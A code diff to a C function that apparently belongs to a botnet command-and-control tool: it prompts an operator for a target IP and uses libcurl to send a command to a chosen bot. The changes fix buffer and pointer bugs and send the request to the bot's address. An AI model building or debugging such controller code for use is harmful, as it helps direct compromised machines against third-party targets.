@@ -175,11 +175,12 @@ void sendCommand(char *command, int bot_id)
 
         CURLcode res;
 
-        char *url;
+        char url[255] = {0};
 
-        char bot_ip[INET_ADDRSTRLEN];
-        char target_ip[INET_ADDRSTRLEN];
-        long *bot_port;
+        char bot_ip[INET_ADDRSTRLEN] = {0};
+        char target_ip[INET_ADDRSTRLEN] = {0};
+        long bot_port;
+        
 
         if (botExists(bot_id) < 0)
         {
@@ -187,7 +188,7 @@ void sendCommand(char *command, int bot_id)
             return;
         }
 
-        ret = setBotInfo(bot_port, bot_ip, bot_id);
+        ret = setBotInfo(&bot_port, bot_ip, bot_id);
         if (ret < 0)
         {
             printf("Could not set bot info");
@@ -197,15 +198,17 @@ void sendCommand(char *command, int bot_id)
         printf("Submit target's ip in dot decimal notation: \n");
 
         fgets(target_ip, sizeof(target_ip), stdin);
+
         target_ip[strcspn(target_ip, "\n")] = 0;
 
         updateBotInfo(bot_id, target_ip, command);
 
         // * BUILDING REQUEST
-        url = (char *)malloc(sizeof(target_ip) + sizeof(PROTOCOL));
+        // url = (char *)malloc(sizeof(PROTOCOL) + sizeof(bot_ip) + 1);
 
         strcpy(url, PROTOCOL);
-        strcat(url, target_ip);
+
+        strcat(url, bot_ip);
 
         curl_easy_setopt(curl, CURLOPT_PORT, bot_port);
 
@@ -245,7 +248,6 @@ void sendCommand(char *command, int bot_id)
             curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
         }
 
-        free(url);
         res = curl_easy_perform(curl);
         curl_easy_cleanup(curl);
     }
